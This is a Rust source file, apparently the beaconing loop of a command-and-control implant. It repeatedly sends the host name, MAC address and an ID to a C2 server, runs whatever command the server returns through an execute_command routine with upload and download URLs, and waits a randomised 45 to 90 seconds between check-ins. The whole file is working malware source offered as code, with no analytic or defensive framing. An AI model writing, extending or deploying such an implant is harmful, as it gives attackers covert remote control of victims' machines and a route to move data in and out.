use rand::Rng;
use reqwest::Client;
use serde::Serialize;
use std::{thread, time::Duration};
use sysinfo::System;
use uuid::Uuid;

use crate::commands::execute::execute_command;

#[derive(Serialize)]
struct Beacon {
    timestamp: u64,
    host_name: String,
    mac_addr: String,
    uuid: Uuid,
}

// Main loop for sending beacons and receiving commands
pub async fn run(
    uuid: Uuid,
    mac_addr: String,
    beacon_url: &str,
    upload_url: &str,
    download_url: &str,
) {
    let client = Client::new();
    let mut sys = System::new_all();

    loop {
        // Refresh system information
        sys.refresh_all();

        // Create a new beacon with updated information
        let beacon = Beacon {
            timestamp: chrono::Utc::now().timestamp() as u64,
            host_name: System::host_name().unwrap_or_default(),
            mac_addr: mac_addr.clone(),
            uuid,
        };

        // Send the beacon to the C2 server
        let res = client.post(beacon_url).json(&beacon).send().await;
        println!("Beacon sent at {}", chrono::Utc::now());

        // Handle the response from the server
        match res {
            Ok(response) => {
                if response.status().is_success() {
                    // Parse the command from the server's response
                    let command: serde_json::Value = response.json().await.unwrap();
                    if let Some(cmd) = command.get("command").and_then(|c| c.as_str()) {
                        if !cmd.is_empty() {
                            println!("Executing command: {}", cmd);
                            // Execute the received command
                            match execute_command(uuid, cmd, upload_url, download_url).await {
                                Ok(_) => println!("Command executed successfully."),
                                Err(e) => println!("Command execution failed: {}", e),
                            }
                        }
                    }
                } else {
                    println!("Error response from server : {}", response.status());
                }
            }
            Err(e) => {
                println!("Error response from server: {}", e);
            }
        }

        // Sleep for a random interval between 45 and 90 seconds before sending the next beacon
        let seconds_to_sleep = rand::thread_rng().gen_range(45..91);
        thread::sleep(Duration::from_secs(seconds_to_sleep));
    }
}
